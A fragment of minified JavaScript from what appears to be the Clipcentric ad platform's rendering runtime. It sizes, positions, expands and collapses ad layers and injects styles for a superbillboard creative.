        width: Math.max(v.innerWidth, ma.clientWidth, Va.clientWidth),
        height: Math.max(v.innerHeight, ma.clientHeight, Va.clientHeight)
      };
    },
    uh = function () {
      try {
        var a = "interstitial" === L.getPlacementType();
      } catch (b) {}
      a ? vc = !0 : 0 < ea && (a = yf(), vc = a.width * a.height >= .9 * Y * ea);
    },
    tf = function (a) {
      var b = {
        x: 0,
        y: 0,
        width: v.innerWidth,
        height: v.innerHeight
      };
      if (L) try {
        var c = L.getCurrentPosition();
        b.x = c.x;
        b.y = c.y;
        b.width = c.width;
        b.height = c.height;
      } catch (e) {}
      b.width && b.height || (b.width = v.innerWidth, b.height = v.innerHeight);
      se && !a && (b.x = hc, b.y = ic);
      return b;
    },
    dh = function () {
      var a = {};
      if (L) try {
        a = L.getMaxSize();
      } catch (b) {}
      a && a.width || (a = {
        width: v.innerWidth,
        height: v.innerHeight
      });
      return a;
    },
    Lb = [],
    hc = 0,
    ic = 0,
    vh = 0,
    wh = 0,
    xh = 0,
    yh = 0,
    Gf = 0,
    Hf = 0,
    If = 0,
    Jf = 0,
    zh = 0,
    se,
    Ef = 400,
    Ah = function (a) {
      if (V) var b = tf(!0);else b = Ec(!0), b = {
        x: b.self.l,
        y: b.self.t
      };
      if (xh !== b.x || yh !== b.y) Gf = hc, Hf = ic, If = b.x, Jf = b.y, xh = b.x, yh = b.y, zh = a + Ef;
      a = zh - a;
      0 < a ? (a = 1 - a / Ef, hc = Gf + a * (If - Gf), ic = Hf + a * (Jf - Hf)) : (hc = If, ic = Jf);
      if (vh !== hc || wh !== ic) for (a = 0; a < Lb.length; a++) try {
        Lb[a]();
      } catch (c) {}
      vh = hc;
      wh = ic;
      jb && 0 < Lb.length ? (v.requestAnimationFrame(Ah), se = !0) : (Lb.length = 0, se = !1);
    },
    ge = function (a) {
      if ($d && !a) try {
        $d();
      } catch (l) {}
      a = [1, 2, 11, 12];
      var b = {
          1: 0,
          2: 0,
          12: 0,
          11: 0
        },
        c;
      if (ja && cd) return Math.round(ja.h + ja.y);
      cc || (wb(), af(), md(), he());
      var e = 0;
      cd = !0;
      for (c = 0; c < a.length; c++) {
        var d = a[c];
        if (d === S[d]) {
          ae[d] || (cd = !1);
          var f = Ya(d, !1);
          for (d = b[d]; void 0 !== d;) {
            var g = S[d];
            !ae[g] && 0 < d && (cd = !1);
            var k = "left" === f.hp ? f.left : f.ow - f.width - f.right;
            var h = "right" !== f.vp ? f[f.vp] : f.oh - f.height - f[f.vp];
            g = Ya(g, !1);
            g.width = Math.max(g.width, k + f.width);
            g.height = Math.max(g.height, h + f.height);
            f = g;
            d = b[d];
          }
          e = Math.max(e, f.height || 0);
        }
      }
      ja && cd ? e = Math.round(ja.h + ja.y) : 0 >= e && (d = S[0], e = fa[d][4]);
      return e;
    },
    ci = function (a) {
      var b = ge(!0);
      a = a.replace(/\?height=\d+/, "?height=" + b);
      return uc.notify(a);
    },
    jc = function () {
      var a,
        b = 0,
        c = 0,
        e;
      if (jb) {
        var d = S[0];
        var f = z(d)[0];
        var g = f.style;
        var k = f.getBoundingClientRect();
        var h = D(d);
        var l = e = parseInt(g.width) || h[5];
        var m = h = parseInt(g.height) || h[6];
        for (a = 0; 17 >= a; a++) if (a === S[a] && a !== d) {
          var n = fa[a];
          var p = O[a];
          if ((p[0] || p[3]) && n && !("number" === typeof n[10] && 0 < n[10] && null === n[12]) && (p = (p = z(a)) && p[0])) {
            if (n[11]) var r = !0;else {
              p = p.getBoundingClientRect();
              n = p.left - k.left;
              var t = p.top - k.top;
              var q = p.right - p.left;
              p = p.bottom - p.top;
              0 < q && 0 < p && (n < b && (b = n), t < c && (c = t), n + q > e && (e = n + q), t + p > h && (h = t + p));
            }
            if (1 === a || 2 === a) var x = !0;
          }
        }
        if (!ja || ja.x !== b || ja.y !== c || ja.w !== e || ja.h !== h || ja.iw !== l || ja.ih !== m || ja.v !== r) {
          k = 0 > b || 0 > c || e > l || h > m ? 1E6 : !1;
          if (!1 !== k) {
            if (ja && ja.p) {
              var w = ja.p;
              var u = ja.z;
            } else for (w = [], u = []; f && f.offsetWidth < 1.2 * e && f.offsetHeight < 1.2 * h;) w.push(f.style), u.push(f.style.zIndex), f = f.offsetParent;
            for (f = 0; f < w.length; f++) w[f].zIndex !== k && (w[f].zIndex = k);
          } else if (ja && ja.p) for (w = ja.p, u = ja.z, f = 0; f < w.length; f++) w[f].zIndex !== u[f] && (w[f].zIndex = u[f]);
          f = ja;
          ja = {
            x: b,
            y: c,
            w: e,
            h: h,
            iw: l,
            ih: m,
            v: r,
            p: w,
            z: u
          };
          f || (f = ja, f.w = -1);
          V && L && uh();
          if (oa) {
            if (p = {}, w = Ec(), r ? (0 < w.exp.l && (b = -w.exp.l), 0 < w.exp.t && (c = -w.exp.t), 0 < w.exp.r && (e = w.exp.r + l), 0 < w.exp.b && (h = w.exp.b + m)) : (n = Math.ceil((Yb - l) / 2), l = w.exp.r + Yb - e, r = -w.exp.l - b, l < r ? n = Math.round((l - r) / 2) : n > l ? n = l : n < r && (n = r), b += n, e += n, l = n, 0 > b && (l += Math.min(-b, w.exp.l)), g.marginLeft = l + "px"), e > Yb || h > dd || 0 > b || 0 > c) a: {
              if (p.l = 0 > b ? -b : 0, p.t = 0 > c ? -c : 0, p.r = e > Yb ? e - Yb : 0, p.b = h > dd ? h - dd : 0, p.push = Fg["exp-push"] && x, g = p, e = ["l", "r", "t", "b", "push"], oa) {
                wc = {};
                for (x = 0; x < e.length; x++) b = e[x], b in g && (wc[b] = g[b]);
                if (wa) {
                  c = wa.expmax;
                  for (x = 0; 4 > x; x++) if (b = e[x], Math.min(g[b], c[b]) !== wa[b]) {
                    var A = !0;
                    break;
                  }
                  g.push !== wa.push && (A = !0);
                  if (!A) break a;
                }
                A = oa.status();
                "collapsed" === A ? Lg(A) : /exp/.test(A) && oa.collapse();
              }
            } else /col/.test(oa.status()) || (wa = wc = null, oa && oa.collapse(), g.marginLeft = g.marginTop = "0px");
          } else !V || !L || ce || vc && !/expanded|resized/i.test(V) || ((g.marginLeft = "calc(50vw - " + ja.iw / 2 + "px)", !Zd || r || Xb || /expanded|resized/i.test(V)) ? r ? "default" !== V || Xb || (Xb = !0, L.setExpandProperties({
            useCustomClose: !0
          }), L.expand()) : e <= l && h <= m && 0 <= b && 0 <= c && !r && /expanded|resized/i.test(V) && !ad && (be = ad = !0, L.close()) : jb && ((A = ge(!0), uc) ? (bd || (bd = lb("mggs/:m/boliaesdg.oolg.eoc/moctnneHtiehg?tehgith=")), uc.notify(bd + A)) : (!Gb && (Gb = B.querySelector(lb("G#DAeRlfwoeMssneegr"))) && (Gb.srcdoc = "", Gb = B.createElement("iframe"), Gb.style.display = "none", I(ma, Gb), bd = lb("mggs/:m/boliaesdg.oolg.eoc/moctnneStzi?eehgith=")), Gb && (Gb.src = bd + A))));
        }
      }
    },
    Ya = function (a, b, c) {
      var e = fa[a],
        d,
        f = [],
        g = [],
        k = [],
        h = [],
        l = [],
        m = [],
        n = [],
        p = [],
        r = [],
        t = [];
      var q = {};
      if (e) {
        var x = e[5];
        var w = e[6];
        var u = e[10];
        var A = e[15];
        var ba = e[16];
        var E = e[1];
        var F = e[2];
        var T = yb(a);
        var P = ca(a);
        var N = D(a);
        var Q = (d = z(a)) && d[0];
      } else return q;
      if (c) {
        if (17 < c) return q;
        c++;
      } else c = 1;
      var ka = 0 === Ha[a];
      if (ua === a) return {
        sx: 1,
        sy: 1,
        width: Y,
        height: ea
      };
      var C = e[3];
      var G = e[4];
      if ("number" === typeof u) {
        u = S[u];
        var H = t[u] = Ya(u, !1, c);
        f[0] = H.width;
        f[1] = H.height;
      } else if ("dom" === u) {
        var y = Q && Q.parentNode;
        for (f[0] = f[1] = 0; y;) if (f[0] = y.clientWidth, f[1] = y.clientHeight, 0 >= f[0]) y = y.parentNode;else break;
        0 >= f[0] && (f[0] = C);
        0 >= f[1] && (f[1] = G);
      } else ka ? (f[0] = ub, f[1] = vb) : (f[0] = Y, f[1] = Nd);
      h[0] = h[1] = "original";
      l[0] = l[1] = 0;
      m[0] = m[1] = Number.MAX_VALUE;
      if ("independent" === x) h[0] = w[0], n[0] = w[1], p[0] = w[2], /^(view|page|container|layer)$/.test(h[0]) && (l[0] = w[3], m[0] = w[4]), h[1] = w[7], n[1] = w[8], p[1] = w[9], /^(view|viewmax|page|container|layer)$/.test(h[1]) && (l[1] = w[10], m[1] = w[11]);else if ("withparent" === x) h[0] = h[1] = x;else if (/^(bestfit|exactfit|cover)$/.test(x)) {
        var Ea = !0;
        y = w[0];
        /(view|container|adslot)/.test(y) ? h[0] = h[1] = y : "number" === typeof y && (h[0] = h[1] = "layer", p[0] = p[1] = y);
        n[0] = n[1] = 100;
        l[0] = w[5];
        m[0] = w[6];
        l[1] = w[7];
        m[1] = w[8];
        "exactfit" !== x && (l[0] = Math.max(l[0], l[1] * C / G), l[1] = Math.max(l[1], l[0] * G / C), m[1] && m[0] ? (m[0] = Math.min(m[0], m[1] * C / G), m[1] = Math.min(m[1], m[0] * G / C)) : m[1] ? m[0] = m[1] * C / G : m[1] = m[0] * G / C);
      }
      for (y = 0; 2 > y; y++) if ("view" === h[y]) r[y] = 0 === y ? Y : ea;else if ("viewmax" === h[y]) r[y] = 0 === y ? Y : Nd;else if ("page" === h[y]) r[y] = void 0;else if ("container" === h[y]) r[y] = f[y];else if ("adslot" === h[y]) r[y] = void 0;else if ("layer" === h[y]) {
        p[y] = S[p[y]];
        var ha = t[p[y]] ? t[p[y]] : t[p[y]] = Ya(p[y], !1, c);
        r[y] = 0 === y ? ha.width : ha.height;
      }
      "independent" === x && (/^(view|page|container|layer)$/.test(h[0]) && (r[0] = "px" === w[6] ? r[0] - w[5] : r[0] * (1 - w[5] / 100)), /^(view|viewmax|page|container|layer)$/.test(h[1]) && (r[1] = "px" === w[13] ? r[1] - w[12] : r[1] * (1 - w[12] / 100)));
      Ea && (r[0] = "px" === w[2] ? r[0] - w[1] : r[0] * (1 - w[1] / 100), r[1] = "px" === w[4] ? r[1] - w[3] : r[1] * (1 - w[3] / 100), /^(bestfit|cover)$/.test(x) && (C * r[1] > r[0] * G ? h["bestfit" === x ? 1 : 0] = "keepaspect" : h["bestfit" === x ? 0 : 1] = "keepaspect"));
      1 !== Z && e[11] && b && 0 < (Z & 390) && 8 > ob && (ma.scrollTop = ma.scrollTop);
      g[0] = k[0] = C;
      g[1] = k[1] = G;
      for (y = 0; 2 > y; y++) "fixed" === h[y] ? g[y] = n[y] : "withparent" === h[y] && H ? (g[y] *= 0 === y ? H.sx : H.sy, g[y] = Math.round(g[y])) : /^(original|keepaspect)$/.test(h[y]) || (g[y] = Math.round(r[y] * n[y] / 100), g[y] < l[y] && (g[y] = l[y]), m[y] > l[y] && g[y] > m[y] && (g[y] = m[y]));
      c = g[0];
      g = g[1];
      "keepaspect" === h[0] && (c = Math.round((C - 0) * g / (G - 0)));
      "keepaspect" === h[1] && (g = Math.round((G - 0) * c / (C - 0)));
      N[13] = c / C;
      N[14] = g / G;
      q.sx = c / k[0];
      q.sy = g / k[1];
      H && (e[13] && (E *= H.sx), e[14] && (F *= H.sy));
      /left|right/.test(A) || (E = f[0] / 2 - c / 2 + E);
      /top|bottom/.test(A) || (F = f[1] / 2 - g / 2 + F);
      1 !== Z && /view/.test(u) ? (k = 0 <= A.indexOf("right") ? "right" : "left", h = 0 <= A.indexOf("bottom") ? "bottom" : "top") : (k = "left", h = "top", 0 < (ba & 1) ? 0 <= A.indexOf("left") ? E = -c - E : 0 <= A.indexOf("right") && (E = f[0] + E) : 0 < (ba & 4) && H ? ((E = z(u)) && E[0] ? x = E[0].getBoundingClientRect() : (x = H, void 0 === x.left && (x.left = x.ow - x.right - x.width)), wb(), E = 0 <= A.indexOf("left") ? e[1] - x.left : 0 <= A.indexOf("right") ? Y - c - x.left - e[1] : Y / 2 - c / 2 - x.left + e[1]) : 0 <= A.indexOf("right") && (E = f[0] - c - E), 0 < (ba & 2) ? 0 <= A.indexOf("top") ? F = -g - F : 0 <= A.indexOf("bottom") && (F = f[1] + F) : 0 <= A.indexOf("bottom") && (F = f[1] - g - F));
      1 === Z || "view" !== u || /top|bottom/.test(A) || (h = "center", F = e[2], H && e[14] && (F *= H.sy), F = -(g / 2) + F);
      q.hp = k;
      q.vp = h;
      q[k] = E;
      q[h] = F;
      q.width = c;
      q.height = g;
      q.ow = f[0];
      q.oh = f[1];
      if (N[72]) {
        Q && (x = Q.getBoundingClientRect(), q.width = c = x.width, q.height = g = x.height);
        q.sx = q.sy = 1;
        var aa = !0;
      }
      if (b) {
        b = c + "|" + g + "|" + E + "|" + F;
        if (N[4] === b) return q;
        N[4] = b;
        N[5] = c;
        N[6] = g;
        N[7] = E;
        N[8] = F;
        N[9] = k;
        N[10] = h;
        N[11] = C = c / C;
        N[12] = G = g / G;
        N[17] = H;
        if (aa) return q;
        H = Q.style;
        aa = d[1].style;
        H.width = aa.width = c + "px";
        H.height = aa.height = g + "px";
        aa = h;
        Q = Q.style;
        "center" === aa ? (Q.top = "calc(50% + " + F + "px)", Q.bottom = "auto") : (Q[aa] = F + "px", Q["top" === aa ? "bottom" : "top"] = "auto");
        H[k] = E + "px";
        H["left" === k ? "right" : "left"] = "auto";
        ka && jc();
        ka = d[2];
        "video" === T && (F = c, E = g, b = ta[P], H = b.ow, aa = b.oh, Q = z(P)[2], e = Q.parentNode.style, e.position = "absolute", e.top = "0px", e.left = "0px", e.width = F + "px", e.height = E + "px", u = Q.tagName, e = b.crop || {
          t: 0,
          r: 0,
          b: 0,
          l: 0
        }, "VIDEO" === u ? (b = Q.style, 0 < e.l || 0 < e.r || 0 < e.t || e.b ? (f = Math.max(H * (1E3 - e.l - e.r) / 1E3, 10), ba = Math.max(aa * (1E3 - e.t - e.b) / 1E3, 10), u = f * E, A = F * ba, u === A ? (u = F / f, aa *= u, H *= u, F = -(H * e.l / 1E3), E = -(aa * e.t / 1E3)) : u > A ? (u = E / ba, aa *= u, H *= u, F = -(((1E3 + e.l - e.r) / 1E3 * H - F) / 2), E = -(aa * e.t / 1E3), H += 2, --F) : (u = F / f, H *= u, aa *= u, F = -(H * e.l / 1E3), E = -(((1E3 + e.t - e.b) / 1E3 * aa - E) / 2), aa += 2, --E), b.position = "absolute", b.top = E + "px", b.left = F + "px", b.width = H + "px", b.height = aa + "px", Q.width = H, Q.height = aa) : (b.position = "absolute", b.top = "0px", b.left = "0px", b.width = "100%", b.height = "100%")) : "CANVAS" === u && Q.setSize(F, E), (d = d[4]) && d.ccScale(1 === Z ? .5 : 1 / Wb));
        if ("canvas" === T) {
          d = Math.ceil(c * $a);
          Q = Math.ceil(g * $a);
          if (d !== ka.width || Q !== ka.height) ka.width = d, ka.height = Q, Tf(a);
          d = Da[P];
          N[54] && (P = lc.now(), d.once = !0, d.animateFunc(P));
        }
        "button" === T && (P = c, d = ca(a), d = pc[d].msize, 1 !== Z && P < d && (P = d - P + "px", d = z(a), ka = d[1], ka.style.padding = P, Dc(ka, "translate(-" + P + ",-" + P + ")"), P = d[0], P.style.overflow = "visible"));
        "frame" === T && th(a, c, g);
        1 !== a && 2 !== a || fc();
        a = tg[a];
        T = N[59];
        if (a && T) for (d = 0; d < a.length; d++) N = a[d], P = T[d + 1].style, P.left = N[0] * C + "px", P.top = N[1] * G + "px", P.width = N[2] * C + "px", P.height = N[3] * G + "px", P.borderRadius = N[5] * (C + G) / 2 + "px";
      }
      return q;
    },
    fc = function () {
      var a,
        b = [1, 2];
      try {
        var c = S[0];
        var e = D(c);
        var d = z(c)[0].style;
      } catch (h) {
        return;
      }
      for (c = a = 0; 2 > c; c++) {
        var f = b[c];
        var g = O[f];
        f = D(f);
        if (g[0] || g[3]) {
          if (g[7]) {
            var k = g[12];
            g = g[8] ? k * f[6] : (1 - k) * f[6];
          } else g = f[6];
          a = "bottom" === f[10] ? Math.max(a, e[6] - f[8] + g, 0) : Math.max(a, f[8] + g - e[6], 0);
        }
      }
      d.paddingBottom = a + "px";
    },
    Sa = function (a, b, c) {
      var e,
        d = {};
      try {
        var f = S[a];
        if (2 !== b || f === a) {
          var g = Ha[a];
          if (!d[f] && jb) {
            var k = O[f];
            var h = D(f);
            var l = fa[f];
            for (e = ca(f); 0 < k[20].length;) sa(k[20].pop());
            if (!k[0] && !O[g][4]) if (c && Bi(e), 32 !== h[1]) h[1] |= 4, c && (h[1] |= 8), R && (h[1] |= 16), (0 === (h[1] & 1) || c) && je(f);else {
              k[0] = !0;
              k[1] = !1;
              ae[f] = !0;
              na("ls:" + Oa[f] + ",li" + (c ? ",ii" : ""));
              l && (z(f), z(f), h[58] = f, "canvas" === yb(f) && (Da[e].lid = f), R && pa && (h[4] = void 0), Ya(f, !0));
              1 === f && (R && pa && h[54] || Mc(f), R && !ee ? K(f, !0) : Kf(f, !0));
              2 === f && (/^http/.test(z(f)[2].getAttribute("src")) || (z(f)[2].src = Za(l[9])), R && !ee ? K(f, !0) : Kf(f, !0));
              3 === f && (R && pa && h[54] || Mc(f), K(f, !0));
              4 === f && (/^http/.test(z(f)[2].getAttribute("src")) || (z(f)[2].src = Za(l[9])), K(f, !0));
              5 === f && K(f, !0);
              6 === f && K(f, !0);
              7 === f && (R && pa || (h[24] = 0, Jb[e] = {}, c || Nb ? da(e, "open", null, c) : (sa(h[31]), h[31] = la(da, 1, e, "open", null, c))), K(f, !0));
              8 === f && (R && pa || (h[24] = 0, Jb[e] = {}, c || Nb ? da(e, "open", null, c) : (sa(h[31]), h[31] = la(da, 1, e, "open", null, c))), K(f, !0));
              9 === f && K(f, !0);
              11 === f && K(f, !0);
              12 === f && K(f, !0);
              13 === f && K(f, !0);
              14 === f && K(f, !0);
              15 === f && Bh(f, !0);
              if (16 === f) {
                a = f;
                if (Ch) {
                  Ch = !1;
                  var m = "/**\n * Copyright 2023 Clipcentric, Inc.\n *\n * This code is owned by Clipcentric and is authorized for use only\n * within the context of ads served using the Clipcentric platform.\n * cclocked: This layer is locked.\n *\n * Created: 2023-07-21 by Quiahn Ballou\n * This script mimics a superbillboard widget by adding styles to the\n * page.\n */\n!function(){var header=document.querySelector('.site-header'),page=document.querySelector('#page'),headerHeight=header.offsetHeight;const observer=new MutationObserver(mutations=>{mutations.forEach(mutation=>{if(mutation.type==='attributes'&&mutation.attributeName==='class'){if(header.classList.contains('sticky')){header.classList.remove('sticky');}}});});const config={attributes:true,attributeFilter:['class']};observer.observe(header,config);CCAD.addEventListener('layeropen',function(e){if(e.data.name==='collapsed'){CCAD.addStyle('.cc-exp { padding-top: '+headerHeight+'px!important; }');CCAD.addStyle('.cc-exp { transition: none!important; }');CCAD.addClass(page,'cc-exp');observer.disconnect();}})\nCCAD.addEventListener('layerclose',function(e){if(e.data.name==='collapsed'){observer.observe(header,config);header.classList.remove('sticky');headerHeight=header.offsetHeight;CCAD.removeClass(page,'cc-exp');}})}();";
                  Jg && (m = "");
                  Dh[16] = m;
                }
                m = Dh[a];
                try {
                  if (m) {
                    var n = v;
                    try {
                      top.alert && (n = top);
                    } catch (t) {}
                    var p = hh(n, a);
                    var r = new Function(["window", "document", "self", "CCAD"], m);
                    r(n, n.document, n, p);
                  }
                } catch (t) {
                  console.log(t);
                }
                k[0] = !1;
              }
              17 === f && Eh(f, !0);
              R || (f = Ha[f], 3 === f && (Sa(13, 2, c), Sa(14, 2, c)));
              jc();
              rf(0, f);
              nd("layeropen", {
                userAction: !!c,
                name: decodeURIComponent(Oa[g] || "undefined")
              });
            }
          }
        }
      } catch (t) {}
    },
    va = function (a, b, c) {
      var e;
      try {
        var d = S[a];
        if (2 === b) if (R) d = a;else if (d !== a) return;
        var f = Ha[a];
        var g = O[d];
        var k = D(d);
        for ((e = z(d)) && z(d); 0 < g[19].length;) sa(g[19].pop());
        k[1] &= -13;
        g[0] && (g[0] = !1, g[1] = !1, R && pa || (g[3] = !0), na("le:" + Oa[d]), ua === d && da(d, "fullscreenoff", null, !1), 1 === d && (qf(d), fc(), jc(), R && pa || (K(d, !1), La(d)), R || va(5, 2, c)), 2 === d && (qf(d), fc(), jc(), R && pa || (K(d, !1), La(d)), R || va(6, 2, c)), 3 === d && (R && pa || (K(d, !1), La(d)), R || va(13, 2, c)), 4 === d && (R && pa || (K(d, !1), La(d)), R || va(14, 2, c)), 5 === d && (R && pa || (K(d, !1), La(d)), R || va(7, 2, c)), 6 === d && (R && pa || (K(d, !1), La(d)), R || va(8, 2, c)), 7 === d && (R && pa || (K(d, !1), La(d)), R || va(9, 2, c)), 8 === d && (R && pa || (K(d, !1), La(d)), R || va(9, 2, c)), 9 !== d || R && pa || (K(d, !1), La(d)), 11 !== d || R && pa || (K(d, !1), La(d)), 12 !== d || R && pa || (K(d, !1), La(d)), 13 !== d || R && pa || (K(d, !1), La(d)), 14 !== d || R && pa || (K(d, !1), La(d)), 15 === d && Bh(d, !1), 17 === d && Eh(d, !1), nd("layerclose", {
          userAction: !!c,
          name: decodeURIComponent(Oa[f] || "undefined")
        }));
      } catch (h) {}
    },
    La = function (a) {
      var b = O[a],
        c = yb(a);
      b[3] = !1;
      pa || ("video" === c && da(a, "close", null, !1), "canvas" === c && Uf(a));
      1 !== a && 2 !== a || fc();
      jc();
    },
    Kf = function (a, b, c) {
      try {
        var e = z(a)[0],
          d = z(a)[1],
          f = O[a],
          g = D(a),
          k = fa[a],
          h = Ka(),
          l = e.style,
          m = d.style,
          n;
        c || (f[7] ? (sa(f[13]), f[9] = h - (1 - f[11]) * f[10]) : (f[7] = !0, f[9] = h), f[8] = b, f[10] = k[b ? 18 : 19], K(a, !0), m.left = m.top = "0px");
        if (1 === a) {
          f[11] = n = 0 < f[10] ? (h - f[9]) / f[10] : 1;
          1 <= n ? (f[11] = n = 1, f[7] = !1, b || (f[3] = !1), b || va(5, 2)) : n = .5 - Math.cos(n * Math.PI) / 2;
          f[12] = n;
          var p = "top";
          var r = (n - 1) * g[6];
          var t = !0;
          fc();
          jc();
        }
        2 === a && (f[11] = n = 0 < f[10] ? (h - f[9]) / f[10] : 1, 1 <= n ? (f[11] = n = 1, f[7] = !1, b || (f[3] = !1), b || va(6, 2)) : n = .5 - Math.cos(n * Math.PI) / 2, f[12] = n, p = "top", r = (n - 1) * g[6], t = !0, fc(), jc());
        m[p] = Math.round(r) + "px";
        t && (l.height = (b ? f[12] : 1 - f[12]) * g[6] + "px");
        f[7] ? f[13] = la(Kf, 5, a, b, !0) : b || La(a);
      } catch (q) {}
    },
    qf = function (a) {
      try {
        var b = O[a];
        var c = D(a);
        var e = z(a);
        var d = e[1].style;
        var f = e[0].style;
        b[7] && (b[7] = !1, sa(b[13]));
        d.left = d.top = "0px";
        f.height = c[6] + "px";
      } catch (g) {}
    },
    Ch = !0,
    Dh = [],
    Fh = !0,
    Jc,
    Ji = {
      17: {
        cond: "none",
        style: ".site-header {\n    transition:none!important;\n    \n}\n#div-gpt-ad-8675309-Superbillboard {\n    height:auto!important;\n}",
        trig: [],
        term: []
      }
    },
    Lf = [],
    Mf = [],
    pd = [],
    Eh = function (a, b) {
      b ? a === S[a] && Gh(a) : pd[a] && (eb(pd[a]), pd[a] = null);
    },
    Gh = function (a) {
      if (Fh) {
        Fh = !1;
        Jc = v;
        try {
          top.alert && (Jc = top);
        } catch (g) {}
      }
      if (O[a][0]) {
        var b = Ji[a];
        Lf[a] || (Lf[a] = hh(Jc, a));
        if ("none" === b.cond) var c = !0;else {
          if (b.code) {
            var e = new Function(["window", "document", "self", "CCAD"], "return (" + b.code + ")");
            try {
              var d = e(Jc, Jc.document, Jc, Lf[a]);
            } catch (g) {
              console.log(g);
            }
            d && (c = !0);
          } else if (b.sel) try {
            B.querySelector(b.sel) && (c = !0);
          } catch (g) {}
          !c && jb && "once" !== b.run && (e = Ka(), Mf[a] || (Mf[a] = e), ("repeat" === b.run || e - Mf[a] < 1E3 * b.run) && la(Gh, 50, a));
        }
        if (c) {
          if (!pd[a]) try {
            var f = B.createElement("style");
            f.appendChild(B.createTextNode(b.style));
            I(B.head, f);
            pd[a] = f;
          } catch (g) {}
          a = b.trig;
          b = b.term;
          if (a) for (c = 0; c < a.length; c++) Sa(a[c], 1);
          if (b) for (c = 0; c < b.length; c++) va(b[c], 1);
        }
      }
    },
    Hh = {
      15: {
        atmv: 0,
        bbtrig: [],
        btmv: 1,
        abtrig: [],
        atterm: [],
        aba: "p",
        atmu: "percent",
        btterm: [3],
        layer: 11,
        bba: "p",
        btmu: "px",
        bbterm: [],
        bbmu: "px",
        bta: "p",
        abterm: [],
        ata: "f",
        abmu: "px",
        bbmv: 0,
        attrig: [3],
        abmv: 0,
        bttrig: []
      }
    },
    Nf = !1,
    Of = {},
    qd = {},
    Bh = function (a, b) {
      if (Hh[a]) if (b) {
        Of[a] = !0;
        qd[a] || (qd[a] = 0);
        if (!Nf) if (Nf = !0, V) a: {
          for (a = 0; a < Lb.length; a++) if (Lb[a] === rd) break a;
          Lb.push(rd);
          1 === Lb.length && v.requestAnimationFrame(Ah);
        } else M(v, "scroll", rd);
        rd();
      } else delete Of[a];
    },
    rd = function (a) {
      var b;
      a = ea;
      var c = Math.max(ma.scrollTop, Va.scrollTop);
      var e = [];
      var d = [];
      var f = 0;
      for (b in Of) {
        var g = Hh[b];
        f++;
        var k = g.layer;
        var h = qd[b];
        if ("number" === typeof k) {
          var l = S[k];
          k = O[l];
          l = (l = z(l)) && l[0];
          if (k[0] && l) {
            k = uf(l);
            var m = 0;
            l = "px" === g.abmu ? g.abmv : g.abmv / 100 * a;
            var n = "p" === g.aba ? k.top : k.bottom;
            n <= a - l && (m |= 4, 0 === (h & 4) && (e = e.concat(g.abtrig), d = d.concat(g.abterm)));
            l = "px" === g.atmu ? g.atmv : g.atmv / 100 * a;
            n = "p" === g.ata ? k.top : k.bottom;
            n <= l && (m |= 1, 0 === (h & 1) && (e = nb(e, g.attrig, g.atterm), d = nb(d, g.atterm, g.attrig)));
            l = "px" === g.btmu ? g.btmv : g.btmv / 100 * a;
            n = "p" === g.bta ? k.bottom : k.top;
            n >= l && (m |= 2, 0 === (h & 2) && (e = nb(e, g.bttrig, g.btterm), d = nb(d, g.btterm, g.bttrig)));
            l = "px" === g.bbmu ? g.bbmv : g.bbmv / 100 * a;
            n = "p" === g.bba ? k.bottom : k.top;
            n >= a - l && (m |= 8, 0 === (h & 8) && (e = nb(e, g.bbtrig, g.bbterm), d = nb(d, g.bbterm, g.bbtrig)));
            qd[b] = m;
          }
        } else l = "px" === g.pamu ? g.pamv : g.pamv / 100 * a, c >= l && (m |= 16, 0 === (h & 16) && (e = nb(e, g.patrig, g.paterm), d = nb(d, g.paterm, g.patrig))), l = "px" === g.pbmu ? g.pbmv : g.pbmv / 100 * a, c <= l && (m |= 32, 0 === (h & 32) && (e = nb(e, g.pbtrig, g.pbterm), d = nb(d, g.pbterm, g.pbtrig))), qd[b] = m;
        for (g = 0; g < e.length; g++) Sa(e[g], 1);
        for (g = 0; g < d.length; g++) va(d[g], 1);
      }
      0 !== f && jb || (Nf = !1, fb(v, "scroll", rd));
    };
  (function () {
    var a, b;
    Vb = Ka();
    Tc = Ga.length + "." + Math.random().toString().substr(2, 6) + "." + Vb;
    var c;
    try {
      rb = top.location.href;
    } catch (h) {
      var e = self.location;
      var d = e.ancestorOrigins;
      v.parent === top && B.referrer ? rb = B.referrer : "object" === typeof J && /^http/i.test(J.host) ? (rb = J.host, /tpc.google/.test(e.host) && (rb = rb.replace(/^.*?:/, e.protocol))) : rb = d && 0 < (c = d.length) ? d[c - 1] : e.href;
    }
    rb ? (He = rb.replace(/\/\/.*/, "//"), Ta = rb.replace(/^https?:\/\/([^\/:]+).*/i, "$1"), /\.ampproject\./i.test(Ta) && (Ta = "unknown.ampproject.net")) : Ta = "unknown";
    /^data:/.test(Ta) && (Ta = "unknown");
    var f, g;
    e = B.currentScript;
    if (!e) {
      d = RegExp("/F\\W1722688\\W", "i");
      c = B.getElementsByTagName("script");
      for (g = 0; g < c.length; g++) {
        var k = c[g];
        if (!k.getAttribute("ccinuse")) if ("ccfid1722688" === k.getAttribute("id")) {
          e = k;
          break;
        } else !f && d.test(k.getAttribute("src")) && (f = k);
      }
      e || (e = f);
    }
    e && e.setAttribute("ccinuse", "1");
    Aa = Fa = e;
    if (!J) try {
      if (a = Fa && Fa.getAttribute("ccex")) J = JSON.parse(decodeURIComponent(a)), v.cc1722688 = J;
    } catch (h) {}
    J && "object" === typeof J || (J = {});
    "string" === typeof J.view ? J.view = [J.view] : J.view && J.view.concat || (J.view = []);
    if ("object" === typeof Ja && Ja) for (b in Ja.view && (J.view = J.view.concat(Ja.view)), Ja.click && (Ja.click.join && (Ja.click = Ja.click.join("")), J.click !== Ja.click && (J.click = Bc(J.click) + Bc(Ja.click))), df(Ja.dest) && (J.dest = Ja.dest), Ja) Ja.hasOwnProperty(b) && (/^(view|click|dest)$/.test(b) || (J[b] = Ja[b]));
    Xg(0);
  })();
})();